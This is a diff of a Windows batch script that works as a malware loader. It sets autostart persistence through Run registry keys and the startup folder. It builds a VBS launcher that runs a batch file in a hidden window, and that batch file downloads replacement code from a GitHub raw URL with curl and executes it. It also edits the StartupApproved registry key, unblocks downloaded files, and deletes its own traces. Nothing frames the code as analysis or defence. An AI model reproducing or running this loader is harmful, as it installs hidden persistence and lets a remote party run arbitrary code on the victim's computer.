@@ -8,19 +8,28 @@ copy /Y "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat" "C:\P
 REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Bgin" /t REG_SZ /F /D "C:\ProgramData\bgin.bat" >> nul
 timeout 0 >> nul
 del "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat" >> nul
-echo Set WinScriptHost = CreateObject("WScript.Shell")>> C:\ProgramData\world.vbs
-echo WinScriptHost.Run Chr(34) & "C:\ProgramData\word.bat" & Chr(34), 0>> C:\ProgramData\world.vbs
-echo Set WinScriptHost = Nothing>> C:\ProgramData\world.vbs
-echo @echo off>> C:\ProgramData\word.bat
-echo ping -n 1 www.google.com>> C:\ProgramData\word.bat
-echo if "%%errorlevel%%" == "0" goto online>> C:\ProgramData\word.bat
-echo goto start>> C:\ProgramData\word.bat
-echo.>> C:\ProgramData\word.bat
-echo :online>> C:\ProgramData\word.bat
-echo curl -s "https://raw.githubusercontent.com/anonimusman00-1/Task/main/word.txt" -o "C:\ProgramData\word.bat">> C:\ProgramData\word.bat
-echo timeout 0>> C:\ProgramData\word.bat
-echo start "" "C:\ProgramData\world.vbs">> C:\ProgramData\word.bat
-echo exit>> C:\ProgramData\word.bat
+echo Set WinScriptHost = CreateObject("WScript.Shell")>> "C:\ProgramData\world.vbs"
+set /p "=WinScriptHost.Run " <nul >> "C:\ProgramData\world.vbs"
+set /p "=Chr(34) " <nul >> "C:\ProgramData\world.vbs"
+set /p "=& " <nul >> "C:\ProgramData\world.vbs"
+set /p "=""C:\ProgramData\word.bat" " " <nul >> "C:\ProgramData\world.vbs"
+set /p "=& " <nul >> "C:\ProgramData\world.vbs"
+set /p "=Chr(34), 0" <nul >> "C:\ProgramData\world.vbs"
+echo Set WinScriptHost = Nothing>> "C:\ProgramData\world.vbs"
+echo @echo off>> "C:\ProgramData\word.bat"
+echo :start>> "C:\ProgramData\word.bat"
+echo ping -n 1 www.google.com>> "C:\ProgramData\word.bat"
+echo if "%%errorlevel%%" == "0" goto online>> "C:\ProgramData\word.bat"
+echo REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run" /V Security /t REG_BINARY /D 000000000000000000000000 /F>> "C:\ProgramData\word.bat"
+echo goto start>> "C:\ProgramData\word.bat"
+echo.>> "C:\ProgramData\word.bat"
+echo :online>> "C:\ProgramData\word.bat"
+echo curl -s "https://raw.githubusercontent.com/anonimusman00-1/Task/main/word.txt" -o "C:\ProgramData\word.bat">> "C:\ProgramData\word.bat"
+echo timeout 0>> "C:\ProgramData\word.bat"
+echo start "" "C:\ProgramData\world.vbs">> "C:\ProgramData\word.bat"
+echo exit>> "C:\ProgramData\word.bat"
+start "" "C:\ProgramData\world.vbs"
+timeout 0 >> nul
 powershell.exe Unblock-File -Path "*" >> nul
 powershell.exe Unblock-File -Path "C:\ProgramData\*" >> nul
 exit >> nul
@@ -33,8 +42,10 @@ curl -s "https://raw.githubusercontent.com/anonimusman00-1/Task/main/world.txt" 
 powershell.exe Unblock-File -Path "*" >> nul
 powershell.exe Unblock-File -Path "C:\ProgramData\PSU\*" >> nul
 REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Security" /t REG_SZ /F /D "C:\ProgramData\PSU\start.vbs" >> nul
-start "" /MIN "C:\ProgramData\world.vbs" >> nul
+start "" "C:\ProgramData\world.vbs" >> nul
 timeout 0 >> nul
 del "C:\ProgramData\bgin.bat" >> nul
+del "C:\ProgramData\word.bat" >> nul
+del "C:\ProgramData\world.vbs" >> nul
 del "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat" >> nul
 exit >> nul
